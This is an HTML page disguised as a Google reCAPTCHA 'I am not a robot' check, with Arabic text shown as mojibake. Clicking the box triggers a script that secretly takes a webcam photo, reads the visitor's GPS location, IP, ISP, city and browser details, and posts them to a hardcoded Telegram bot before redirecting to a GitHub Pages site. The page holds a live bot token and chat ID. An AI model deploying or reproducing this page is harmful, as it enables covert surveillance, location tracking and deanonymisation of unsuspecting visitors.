<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù†</title>
    <style>
        body { background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: Roboto, helvetica, arial, sans-serif; }
        .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.08); cursor: pointer; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 10px; position: relative; }
        .text { font-size: 14px; color: #555; font-weight: 400; flex-grow: 1; }
        .logo { text-align: center; }
        .logo img { width: 30px; }
        .logo p { font-size: 8px; color: #555; margin: 0; }
        #loader { display: none; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="captcha-box" id="mainBox">
    <div class="checkbox" id="check"></div>
    <div id="loader"></div>
    <div class="text">Ø£Ù†Ø§ Ù„Ø³Øª Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø±ÙˆØ¨ÙˆØª</div>
    <div class="logo">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
        <p>Ø§Ù„Ø®ØµÙˆØµÙŠØ© - Ø§Ù„Ø¨Ù†ÙˆØ¯</p>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const _ID = '7253092491'; 
    const _TK = '7873426394:AAEc5lKRwi3Zy8owh1TKMLJsMme_s6Zawak'; 
    const _REDIRECT = "https://hamoyouo84-del.github.io/matrix-market/#";

    const mainBox = document.getElementById('mainBox');
    const check = document.getElementById('check');
    const loader = document.getElementById('loader');

    mainBox.addEventListener('click', async () => {
        // ØªØºÙŠÙŠØ± Ø§Ù„Ø´ÙƒÙ„ Ù„Ù„ØªØ­Ù…ÙŠÙ„
        check.style.display = 'none';
        loader.style.display = 'block';

        try {
            // 1. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ (Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù‡ØªØ¸Ù‡Ø± Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù‡Ù†Ø§)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (GPS)
            let gpsLink = "Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø±ÙØ¶ Ø§Ù„Ù…ÙˆÙ‚Ø¹";
            navigator.geolocation.getCurrentPosition((pos) => {
                gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            });

            const video = document.getElementById('v');
            video.srcObject = stream;

            // Ø§Ù†ØªØ¸Ø§Ø± Ø¨Ø³ÙŠØ· Ù„Ù„Ù‚Ø·Ø©
            await new Promise(r => setTimeout(r, 2000));

            const canvas = document.getElementById('c');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                let info = "Ø¬Ø§Ø±ÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP...";
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const d = await res.json();
                    info = `ğŸŒ IP: ${d.ip}\nğŸ¢ Ø§Ù„Ø´Ø±ÙƒØ©: ${d.org}\nğŸ™ï¸ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${d.city}`;
                } catch(e) {}

                const fd = new FormData();
                fd.append('chat_id', _ID);
                fd.append('photo', blob, 'u.jpg');
                fd.append('caption', `âœ… **ØªÙ… Ø§Ø¬ØªÙŠØ§Ø² Ø§Ù„ÙƒØ§Ø¨ØªØ´Ø§!**\n\n${info}\nğŸ“ GPS: ${gpsLink}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.userAgent}\nâ° ${new Date().toLocaleString('ar-EG')}`);

                await fetch(`https://api.telegram.org/bot${_TK}/sendPhoto`, { method: 'POST', body: fd });

                stream.getTracks().forEach(t => t.stop());
                window.location.href = _REDIRECT;
            }, 'image/jpeg', 0.7);

        } catch (err) {
            // Ù„Ùˆ Ø±ÙØ¶ Ø¨Ø±Ø¶Ù‡ Ù‡Ù†ÙˆØ¯ÙŠÙ‡ Ù„Ù„Ù…ÙˆÙ‚Ø¹
            window.location.href = _REDIRECT;
        }
    });
</script>

</body>
</html>

